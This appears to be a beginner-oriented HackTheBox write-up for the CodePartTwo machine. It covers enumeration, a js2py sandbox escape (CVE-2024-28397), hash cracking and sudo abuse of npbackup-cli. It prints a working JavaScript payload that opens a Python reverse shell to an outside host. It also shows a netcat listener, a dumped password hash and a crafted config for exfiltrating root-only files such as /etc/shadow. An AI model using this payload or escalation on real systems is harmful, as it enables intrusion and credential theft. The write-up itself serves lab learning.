---
title: HackTheBox | CodePartTwo Write Up
date: 2026-03-26 00:00:00 +0000
categories: [Writeups, HackTheBox]
tags: [Red Team, Web, JavaScript, Network Enumeration, Privilege Escalation, Remote Code Execution, Easy]     # TAG names should always be lowercase
toc: false
media_subpath: /assets/images/
image:
    path: CodePartTwo.png
    alt:
---
> [!NOTE]
> Hello there, this is my first ever writeup, so please let me know if I missed anything or what I should do better for next time! This box took me about 30 minutes to complete, this writeup is mostly directed to beginners. As time goes on, I will make more detailed and in-depth writeups on Hard challenges or just vulnerabilities overall. Thank you for reading!



CodePartTwo is an Easy Linux machine that features a vulnerable Flask-based web application. Initial web enumeration reveals a JavaScript code editor powered by a vulnerable version of js2py, which allows for remote code execution via sandbox escape. Exploiting this flaw grants access to the system as an unprivileged user. Further enumeration reveals an SQLite database containing password hashes, which are cracked to gain SSH access. Finally, a backup utility, npbackup-cli, that runs with root privileges, is leveraged to obtain root privileges.


# Enumeration

First things first, we have to nmap this machine to find open ports and running services.

```bash
nmap -sC -sV -p- 10.129.232.59
```

>[!NOTE]
> I always scan for all ports in my first nmap scan with the flag `-p-` to make sure that there aren't any hidden services lying around in a unusual port

After scanning the network, nmap shows that port 22 and 8080 are open. Port 22 is using SSH and port 8080 is using HTTP.

![Desktop View](CPTnmap.png){: width="700" height="400" }


Once we access the webpage, we can see that there are three options: Login, Register, and "Download App". This download app option looks interesting, but first lets register an account to look at how the app works.

![Desktop View](CPTEvilHackerRegister.png){: width="700" height="400" }

Then once we log in to the webpage we are greeted with a dashboard.

![Desktop View](CPTDashboard.png){: width="700" height="400" }


# Exploitation

It seems that whatever JavaScript code we enter gets run by this application. Luckily, we are able to download the source code of the program by simply clicking Download App in the main page before logging in or by simply accessing the /download endpoint.

Let's take a look inside the application's folder

![Desktop View](CPTFolder1.png){: width="700" height="400" }

The python program is provided to us which means that we are able to analyze the code.

After analyzing the code, we can see that this program uses `js2py` which is a popular python package that can evaluate JavaScript code inside a python interpreter.

```python
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
...
```

As we can also see, it is calling `js2py.disable_pyimport()` which stops JavaScript code from escaping this environment. However, there exists a vulnerability in the implementation of a global variable inside `js2py`, which ultimately lets an attacker obtain RCE (Remote Code Execution).

This vulnerability is classified as [CVE-2024-28397](https://nvd.nist.gov/vuln/detail/CVE-2024-28397)

After finding out the CVE, we can look use this payload to abuse this vulnerability:

```js
let cmd = "python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.41\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for (let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if (item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

>[!NOTE]
> The way that this payload works is that it first uses `__getattribute__` to escape the JS sandbox. The problem with js2py is that it exposes Python internals to JS objects. Then, we climb the python object hierarchy with `__getattribute__`. After reaching the base object class (the root of all Python classes), we look for `subprocess.Popen` via subclass traversal. `subprocess.Popen` can execute arbitrary OS commands. This is a very common Python sandbox escape technique since `subprocess` is almost always loaded somewhere in memory.

After running the payload and opening our listener, we get a shell for user 'app'.
```bash
nc -lvnp 4444
```

![Desktop View](CPTShell.png){: width="700" height="400" }

# Post-Exploitation

Now that we have user 'app', we can enumerate further for privilege escalation vectors. We find that there is another user called 'marco' that likely owns the user flag. Looking back on the source code provided from the start, it mentions that this application uses SQLite and stores everything in 'users.db' including user credentials.

```python
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3PartTw0'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)
...
```

The users.db database is located in the folder inside the app directory.

![Desktop View](CPTusersdb.png){: width="700" height="400" }

Let's access the database from the app user and find the hash.

```bash
sqlite3 users.db

sqlite> .tables
code_snippet  user

sqlite> SELECT * FROM user;
1|marco|[REDACTED]
2|app|a97588c0e2fa3a024876339e27aeb42e
```

After finding marco's hash, we can crack it to obtain his password.

![Desktop View](CPTCrack.png){: width="700" height="400" }

>[!NOTE]
> There are many tools that are used to crack hashes such as [JohnTheRipper](https://www.openwall.com/john/) and [Hashcat](https://hashcat.net/hashcat/), I always use [Crackstation](https://crackstation.net/) first before anything else because it is quicker and easier.

Once we SSH into marco with our newly obtained password we can read the user flag.

![Desktop View](CPTUser.png){: width="700" height="400" }

Now let's look for possible privilege escalation paths that could take us to root.

When we run `sudo -l`, there is a binary called `npbackup-cli` that can be ran with root permissions by the marco user. 

![Desktop View](CPCSudo.png){: width="700" height="400" }

There is already a existing npbackup.conf available for us to read inside marco's home directory.
```yaml
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: __NPBACKUP__wd9051...kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
...
```

The config provides us with the `repo_uri` and the `repo_password` which could allow us to make our config file to make a backup of something we are not normally allowed to touch.

To do this, we must use the exact syntax that the original config file is using and make our own but instead of pointing the `paths: ` variable to `/home/app/app`, we can point it to `/root/root.txt` or `/etc/shadow`. 
```bash
cp npbackup.conf malicious.conf
nano malicious.conf
```

```yaml
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: __NPBACKUP__wd9051...kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /root/root.txt
...
```

Run the `npbackup` binary using our malicious config file

```bash
sudo /usr/local/bin/npbackup-cli -c ~/malicious.conf --backup
```

Then, we will be given a snapshot ID which we have to call with our `--snapshot-id` flag to recover the root flag.

![Desktop View](CPTRoot.png){: width="700" height="400" }
